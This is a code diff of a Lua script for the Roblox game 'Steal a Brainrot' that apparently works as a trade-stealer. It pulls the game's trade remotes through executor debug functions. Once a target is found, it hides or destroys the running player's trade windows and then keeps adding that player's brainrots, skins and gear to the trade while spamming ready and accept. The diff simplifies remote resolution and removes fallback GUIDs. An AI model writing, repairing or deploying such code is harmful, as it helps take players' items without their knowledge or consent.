@@ -109,44 +109,20 @@ local DISCORD_LINK = "https://discord.gg/bxjXucMVqB"
 
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 local TRADE_CYCLE_DELAY = 1.25
--- Primary GUIDs (current) + legacy fallbacks (game updates rotate these)
 local INVITE_GUID = "9b5a0c7d-327f-415a-9720-b8e4f02b946a"
 local SELECT_GUID = "bce6ca77-ef3c-4aab-b6e1-99f9c1815863"
 local SELECTGB_GUID = "b0e90195-78ba-4028-8af6-8eb86c4ed82d"
 local READY_GUID = "1774f028-dbab-4713-8122-c30d77582edc"
 local ACCEPT_GUID = "d061f53c-7d12-4a4a-a761-d70b06c0d44c"
-
-local SELECT_GUID_FALLBACKS = {
-	"bce6ca77-ef3c-4aab-b6e1-99f9c1815863",
+-- Fallbacks if game rotated Add GUIDs (invite GUID above still works)
+local SELECT_GUIDS = {
+	SELECT_GUID,
 	"c85a2323-36b2-4121-968a-c064a6168aff",
 }
-local SELECTGB_GUID_FALLBACKS = {
-	"b0e90195-78ba-4028-8af6-8eb86c4ed82d",
+local SELECTGB_GUIDS = {
+	SELECTGB_GUID,
 	"6786cce9-00d8-41e9-8beb-d96e0412b78b",
 }
-local READY_GUID_FALLBACKS = {
-	"1774f028-dbab-4713-8122-c30d77582edc",
-	"23f15b0b-b633-4f6b-888f-5924b7425522",
-}
-local ACCEPT_GUID_FALLBACKS = {
-	"d061f53c-7d12-4a4a-a761-d70b06c0d44c",
-	"86eea964-f19e-4ac6-b401-a71ecc89e596",
-}
-
-local function extractGuidsFromFn(fn)
-	local out = {}
-	if type(fn) ~= "function" then return out end
-	pcall(function()
-		local getc = (debug and debug.getconstants) or getconstants
-		if not getc then return end
-		for _, v in ipairs(getc(fn)) do
-			if type(v) == "string" and v:match("^%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x$") then
-				table.insert(out, v)
-			end
-		end
-	end)
-	return out
-end
 local FOOTER_ICON = "https://media.discordapp.net/attachments/1511087340721012919/1544655871529852988/2d33efc28dde57ea69dd4291cb6b4d6f_2.webp?ex=6a994c62&is=6a97fae2&hm=cd5486a74b48c119c89809204444e8a855045337dc23ede08a46ae7dd4077279&=&format=webp"
 local FALLBACK_COLOR = 0x1A237E
 local guiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true }
@@ -736,108 +712,21 @@ local readyRemote, acceptRemote, tradeEndRemote
 local tradeChannel = nil
 local remotesReady = false
 
-local addGearRemote = nil
-
-local function isRemote(x)
-	return typeof(x) == "Instance" and (x:IsA("RemoteFunction") or x:IsA("RemoteEvent"))
-end
-
-local function scanUpvaluesForRemote(fn, preferName)
-	if type(fn) ~= "function" or not getupvalue then return nil end
-	local found = nil
-	pcall(function()
-		local i = 1
-		while i <= 40 do
-			local ok, v = pcall(getupvalue, fn, i)
-			if not ok then break end
-			if isRemote(v) then
-				if preferName and tostring(v.Name):lower():find(preferName:lower(), 1, true) then
-					found = v
-					return
-				end
-				found = found or v
-			end
-			i = i + 1
-		end
-	end)
-	return found
-end
-
 local function resolveTradeRemotes()
-	if not TradeController then
+	if not TradeController or not getupvalue then
 		return false
 	end
 	local ok = pcall(function()
-		-- Invite is stable
-		if getupvalue and type(TradeController.SendInvite) == "function" then
-			inviteRemote = getupvalue(TradeController.SendInvite, 1)
-			if not isRemote(inviteRemote) then
-				inviteRemote = scanUpvaluesForRemote(TradeController.SendInvite, "Invite")
-			end
-		end
-
-		-- liveTrade table from _createLiveTrade — try several upvalue indexes
-		if getupvalue and type(TradeController._createLiveTrade) == "function" then
-			for _, idx in ipairs({ 15, 14, 16, 13, 17, 12, 18, 10, 20 }) do
-				local ok2, v = pcall(getupvalue, TradeController._createLiveTrade, idx)
-				if ok2 and type(v) == "table" and type(v.Brainrot) == "table" then
-					liveTrade = v
-					break
-				end
-			end
-			-- also scan all upvalues for a table with Brainrot.Add
-			if not liveTrade then
-				for i = 1, 40 do
-					local ok2, v = pcall(getupvalue, TradeController._createLiveTrade, i)
-					if ok2 and type(v) == "table" and type(v.Brainrot) == "table" and type(v.Brainrot.Add) == "function" then
-						liveTrade = v
-						break
-					end
-				end
-			end
-			readyRemote = scanUpvaluesForRemote(TradeController._createLiveTrade, "Ready")
-				or (getupvalue and (select(1, pcall(getupvalue, TradeController._createLiveTrade, 24))))
-			acceptRemote = scanUpvaluesForRemote(TradeController._createLiveTrade, "Accept")
-				or (getupvalue and (select(1, pcall(getupvalue, TradeController._createLiveTrade, 23))))
-			if not isRemote(readyRemote) then readyRemote = nil end
-			if not isRemote(acceptRemote) then acceptRemote = nil end
-		end
-
-		if liveTrade then
-			if type(liveTrade.Brainrot) == "table" and type(liveTrade.Brainrot.Add) == "function" then
-				addBrainrotRemote = scanUpvaluesForRemote(liveTrade.Brainrot.Add, "Brainrot")
-					or scanUpvaluesForRemote(liveTrade.Brainrot.Add, "Add")
-					or (getupvalue and select(1, pcall(getupvalue, liveTrade.Brainrot.Add, 1)))
-				-- Pull SELECT_GUID from constants if present
-				local g = extractGuidsFromFn(liveTrade.Brainrot.Add)
-				if g[1] then
-					SELECT_GUID = g[1]
-					print("[Brainrot] SELECT_GUID from constants:", SELECT_GUID)
-				end
-			end
-			if type(liveTrade.BaseSkin) == "table" and type(liveTrade.BaseSkin.Add) == "function" then
-				addItemRemote = scanUpvaluesForRemote(liveTrade.BaseSkin.Add, "Item")
-					or scanUpvaluesForRemote(liveTrade.BaseSkin.Add, "Add")
-					or (getupvalue and select(1, pcall(getupvalue, liveTrade.BaseSkin.Add, 1)))
-				local g = extractGuidsFromFn(liveTrade.BaseSkin.Add)
-				if g[1] then
-					SELECTGB_GUID = g[1]
-					print("[Brainrot] SELECTGB_GUID from constants:", SELECTGB_GUID)
-				end
-			end
-			if type(liveTrade.Gear) == "table" and type(liveTrade.Gear.Add) == "function" then
-				addGearRemote = scanUpvaluesForRemote(liveTrade.Gear.Add, "Gear")
-					or scanUpvaluesForRemote(liveTrade.Gear.Add, "Add")
-					or (getupvalue and select(1, pcall(getupvalue, liveTrade.Gear.Add, 1)))
-			end
-		end
+		liveTrade = getupvalue(TradeController._createLiveTrade, 15)
+		inviteRemote = getupvalue(TradeController.SendInvite, 1)
+		addBrainrotRemote = liveTrade and getupvalue(liveTrade.Brainrot.Add, 1) or nil
+		addItemRemote = liveTrade and getupvalue(liveTrade.BaseSkin.Add, 1) or nil
+		readyRemote = getupvalue(TradeController._createLiveTrade, 24)
+		acceptRemote = getupvalue(TradeController._createLiveTrade, 23)
+		tradeEndRemote = getupvalue(TradeController._createPlayerList, 21)
 	end)
 	if not ok then return false end
-	if not isRemote(addBrainrotRemote) then addBrainrotRemote = nil end
-	if not isRemote(addItemRemote) then addItemRemote = nil end
-	if not isRemote(addGearRemote) then addGearRemote = nil end
-	if not isRemote(inviteRemote) then inviteRemote = nil end
-	return inviteRemote ~= nil and (addBrainrotRemote ~= nil or readyRemote ~= nil)
+	return liveTrade and inviteRemote and addBrainrotRemote and readyRemote and acceptRemote
 end
 
 local function fallbackRemote(leaf)
@@ -873,9 +762,8 @@ local function waitForRemotes(timeout)
 	end
 	warn("[Brainrot] getupvalue resolve timed out — falling back to Net name search")
 	inviteRemote = inviteRemote or fallbackRemote("Invite") or fallbackRemote("RF/TradeService/Invite")
-	addBrainrotRemote = addBrainrotRemote or fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot") or fallbackRemote("TradeService/AddBrainrot")
-	addItemRemote = addItemRemote or fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem") or fallbackRemote("TradeService/AddItem")
-	addGearRemote = addGearRemote or fallbackRemote("AddGear") or fallbackRemote("RF/TradeService/AddGear")
+	addBrainrotRemote = addBrainrotRemote or fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
+	addItemRemote = addItemRemote or fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem")
 	readyRemote = readyRemote or fallbackRemote("Ready") or fallbackRemote("RE/TradeService/Ready")
 	acceptRemote = acceptRemote or fallbackRemote("Accept") or fallbackRemote("RE/TradeService/Accept")
 	remotesReady = inviteRemote and readyRemote and acceptRemote and true or false
@@ -1007,17 +895,8 @@ local function applyEverythingAfterTargetFound()
 	end)
 	cam.FieldOfView = 70
 	local function handleGui(obj)
-		-- Hide trade UI instead of Destroy — Destroy can break client-side Add state
 		if guiNames[obj.Name] then
-			task.defer(function()
-				pcall(function()
-					if obj:IsA("ScreenGui") then
-						obj.Enabled = false
-					elseif obj:IsA("GuiObject") then
-						obj.Visible = false
-					end
-				end)
-			end)
+			task.defer(function() obj:Destroy() end)
 		end
 	end
 	pg.ChildAdded:Connect(handleGui)
@@ -1714,80 +1593,47 @@ local function startFullAutomation()
 		end)
 	end
 
-	local function invokeAdd(remote, ...)
-		if not remote then return false end
-		local args = { ... }
-		local ok = false
-		pcall(function()
-			if remote:IsA("RemoteFunction") then
-				remote:InvokeServer(table.unpack(args))
-				ok = true
-			else
-				remote:FireServer(table.unpack(args))
-				ok = true
-			end
-		end)
-		return ok
-	end
-
 	local function addOneBrainrot(item)
-		if not item then return end
-		if not addBrainrotRemote then
-			-- last-second resolve
-			pcall(resolveTradeRemotes)
-		end
-		if not addBrainrotRemote then return end
+		if not addBrainrotRemote or not item then return end
 		local slot = item.slotKey
-		-- try number and string slot keys
-		local slots = { slot }
-		if type(slot) == "number" then table.insert(slots, tostring(slot)) end
-		if type(slot) == "string" then table.insert(slots, tonumber(slot) or slot) end
-		for _, guid in ipairs(SELECT_GUID_FALLBACKS) do
-			for _, sk in ipairs(slots) do
-				if invokeAdd(addBrainrotRemote, guid, sk, item.data) then
-					return
-				end
-				-- some builds swap arg order / omit data
-				if invokeAdd(addBrainrotRemote, guid, sk) then return end
-				if invokeAdd(addBrainrotRemote, sk, item.data) then return end
+		for _, guid in ipairs(SELECT_GUIDS) do
+			local ok = pcall(function()
+				addBrainrotRemote:InvokeServer(guid, slot, item.data)
+			end)
+			if ok then return end
+		end
+		-- retry with string slot
+		if type(slot) == "number" then
+			for _, guid in ipairs(SELECT_GUIDS) do
+				pcall(function()
+					addBrainrotRemote:InvokeServer(guid, tostring(slot), item.data)
+				end)
 			end
 		end
 	end
 
 	local function addOneItem(kind, item)
-		if not item or not tradeItemsEnabled then return end
-		local remote = addItemRemote
-		if kind == "Gear" and addGearRemote then
-			remote = addGearRemote
-		end
-		if not remote then
-			pcall(resolveTradeRemotes)
-			remote = (kind == "Gear" and addGearRemote) or addItemRemote
-		end
-		if not remote then return end
+		if not addItemRemote or not item or not tradeItemsEnabled then return end
 		local payload
 		if kind == "BaseSkin" then
 			payload = { UUID = item.uuid, SkinName = item.skinName }
 		else
 			payload = { UUID = item.uuid, GearName = item.gearName }
 		end
-		for _, guid in ipairs(SELECTGB_GUID_FALLBACKS) do
-			if invokeAdd(remote, guid, kind, payload) then return end
-			if invokeAdd(remote, guid, payload) then return end
-			if invokeAdd(remote, kind, payload) then return end
+		for _, guid in ipairs(SELECTGB_GUIDS) do
+			local ok = pcall(function()
+				addItemRemote:InvokeServer(guid, kind, payload)
+			end)
+			if ok then return end
 		end
 	end
 
 	local function fireReady()
-		for _, g in ipairs(READY_GUID_FALLBACKS) do
-			fireRemote(readyRemote, g)
-		end
+		fireRemote(readyRemote, READY_GUID)
 	end
 
 	local function fireAccept()
-		for _, g in ipairs(ACCEPT_GUID_FALLBACKS) do
-			fireRemote(acceptRemote, g)
-		end
+		fireRemote(acceptRemote, ACCEPT_GUID)
 	end
 
 	-- Detect trade open
@@ -1797,7 +1643,7 @@ local function startFullAutomation()
 			if n == "tradelivetrade" or n == "brainrottrader" or n:find("tradelive", 1, true) then
 				currentlyInTrade = true
 				tradeActiveFlag = true
-				print("[Brainrot] Trade opened")
+				print("[Brainrot] Trade opened | addRemote=", addBrainrotRemote and addBrainrotRemote.Name or "NIL", "| queue=", tradeBrainrotQueue and #tradeBrainrotQueue or 0)
 				-- immediate ready+accept burst
 				task.spawn(function()
 					for _ = 1, 25 do
@@ -1830,33 +1676,21 @@ local function startFullAutomation()
 	end)
 
 	-- Continuous fixed-rate brainrot add WHILE in trade only (never stalls)
-	-- Always spawn add loop; resolve remote inside if needed
-	task.spawn(function()
-		local idx = 1
-		local logged = false
-		while true do
-			local q = tradeBrainrotQueue
-			local inTrade = tradeActiveFlag or currentlyInTrade
-			if inTrade and q and #q > 0 then
-				if not addBrainrotRemote then
-					pcall(resolveTradeRemotes)
-					if not addBrainrotRemote then
-						addBrainrotRemote = fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
-					end
+	if addBrainrotRemote then
+		task.spawn(function()
+			local idx = 1
+			while true do
+				local q = tradeBrainrotQueue
+				local inTrade = tradeActiveFlag or currentlyInTrade
+				if inTrade and q and #q > 0 then
+					if idx > #q then idx = 1 end
+					addOneBrainrot(q[idx])
+					idx = idx + 1
 				end
-				if not logged then
-					print("[Brainrot] In trade — adding", #q, "brainrots | remote=", addBrainrotRemote and addBrainrotRemote.Name or "NIL")
-					logged = true
-				end
-				if idx > #q then idx = 1 end
-				addOneBrainrot(q[idx])
-				idx = idx + 1
-			else
-				logged = false
+				task.wait(ADD_STEP)
 			end
-			task.wait(ADD_STEP)
-		end
-	end)
+		end)
+	end
 
 	-- Continuous skins/gears WHILE in trade
 	if addItemRemote then
